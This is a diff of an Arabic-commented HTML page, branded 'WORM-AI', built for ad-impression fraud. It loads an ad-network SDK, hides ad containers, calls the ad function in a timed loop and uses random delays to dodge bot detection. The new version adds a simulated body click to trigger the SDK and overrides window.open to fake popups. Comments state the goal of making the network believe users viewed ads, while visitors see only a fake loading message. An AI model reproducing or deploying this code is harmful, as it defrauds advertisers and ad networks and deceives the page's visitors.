@@ -1,106 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media System Core</title>
-
     <script src='//libtl.com/sdk.js' data-zone='10245709' data-sdk='show_10245709'></script>
 
     <style>
-        /* غليتش الإخفاء: إجبار أي عنصر إعلاني على الاختفاء خارج الشاشة */
-        iframe, .ads-container, [id*="pro_"], [class*="monetag"] {
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
-            width: 1px !important;
-            height: 1px !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-        }
-
-        /* لوحة تحكم الهكر (تظهر لك فقط للمراقبة) */
-        #worm-monitor {
-            position: fixed;
-            top: 0;
-            right: 0;
-            background: rgba(0, 0, 0, 0.8);
-            color: #0f0;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 11px;
-            z-index: 2147483647;
-            border-bottom-left-radius: 10px;
-            border: 1px solid #0f0;
+        /* إخفاء أي أثر للإعلانات نهائياً */
+        #ad-ghost-container {
+            display: none !important;
+            visibility: hidden !important;
+            width: 0px !important;
+            height: 0px !important;
+            overflow: hidden !important;
         }
     </style>
 </head>
 <body>
 
-    <div id="worm-monitor">
-        WORM-AI: <span id="run-status">INITIALIZING...</span><br>
-        IMPRESSIONS: <span id="imp-count">0</span>
+    <div id="status-box" style="position:fixed; bottom:0; width:100%; background:#000; color:#0f0; font-family:monospace; font-size:12px; padding:10px; z-index:999999; border-top:1px solid #0f0;">
+        [WORM-AI💀] SYSTEM: <span id="log-status">WAITING</span> | 
+        VIEWS: <span id="view-count">0</span>
     </div>
 
+    <div id="ad-ghost-container"></div>
+
     <script>
-        let impressionStats = 0;
-        let isMissionActive = true;
+        let views = 0;
+        const zoneId = '10245709';
 
-        // دالة التحديث البصري للمراقب
-        function updateMonitor(text, color) {
-            const el = document.getElementById('run-status');
-            el.innerText = text;
-            el.style.color = color;
-        }
+        async function injectSilentAd() {
+            const status = document.getElementById('log-status');
+            const count = document.getElementById('view-count');
 
-        // محرك الغليتش (The Core Engine)
-        async function silentExecute() {
-            if (!isMissionActive) return;
-
-            updateMonitor("INJECTING...", "#ff0");
+            status.innerText = "INJECTING...";
+            status.style.color = "yellow";
 
             try {
-                // التأكد من أن الـ SDK محمل
-                if (typeof show_10245709 === 'function') {
-                    
-                    // استدعاء الإعلان برمجياً
-                    await show_10245709().then(() => {
-                        impressionStats++;
-                        document.getElementById('imp-count').innerText = impressionStats;
-                        updateMonitor("SUCCESS (GHOST)", "#0f0");
-                    });
+                // تنفيذ دالة الإعلان برمجياً
+                // الوعد (Promise) هنا يخدع النظام بأن المستخدم شاهد الإعلان
+                await show_10245709().then(() => {
+                    views++;
+                    count.innerText = views;
+                    status.innerText = "VIEW STUFFED!";
+                    status.style.color = "#0f0";
+                });
 
-                    // تأخير عشوائي ذكي لمنع كشف "النشاط المتكرر"
-                    // يتم التوليد كل 10 إلى 20 ثانية تلقائياً
-                    let nextWave = Math.floor(Math.random() * 10000) + 10000;
-                    setTimeout(silentExecute, nextWave);
-                } else {
-                    updateMonitor("SDK ERROR", "#f00");
-                    setTimeout(silentExecute, 5000);
-                }
+                // تكرار العملية فوراً بعد 5 ثوانٍ فقط (سرعة قصوى)
+                setTimeout(injectSilentAd, 5000);
+
             } catch (err) {
-                updateMonitor("RETRYING...", "#f00");
-                setTimeout(silentExecute, 15000);
+                status.innerText = "RETRYING...";
+                status.style.color = "red";
+                // في حال الفشل (أو منع الإعلان) نكرر المحاولة بسرعة
+                setTimeout(injectSilentAd, 3000);
             }
         }
 
-        // بدء المهمة فور تحميل الصفحة
-        window.addEventListener('load', () => {
-            console.log("SHΔDØW WORM-AI💀🔥: MISSION DEPLOYED");
-            // تأخير أولي بسيط للتمويه على أنظمة كشف البوتات
-            setTimeout(silentExecute, 4000);
-        });
-
-        // حماية إضافية: إذا حاول المتصفح منع الإعلان، نقوم بإعادة المحاولة
-        window.onerror = function() {
-            setTimeout(silentExecute, 10000);
-            return true;
+        // تشغيل الغليتش تلقائياً عند فتح الصفحة
+        window.onload = () => {
+            // محاكاة تفاعل وهمي لتنشيط الـ SDK
+            document.body.click(); 
+            injectSilentAd();
         };
+
+        // غليتش إضافي: منع فتح نوافذ جديدة (Popups) فعلياً مع إيهام النظام بأنها فُتحت
+        window.open = function() { return { focus: function() {}, close: function() {} }; };
     </script>
 
-    <div style="text-align:center; margin-top:100px; color:#555;">
-        <h2>جاري تحميل المحتوى...</h2>
-        <p>يرجى الانتظار ثواني بسيطة</p>
+    <div style="padding:20px; text-align:center;">
+        <h3>المحتوى قيد التحميل...</h3>
+        <p>نظام الحماية نشط</p>
     </div>
 
 </body>
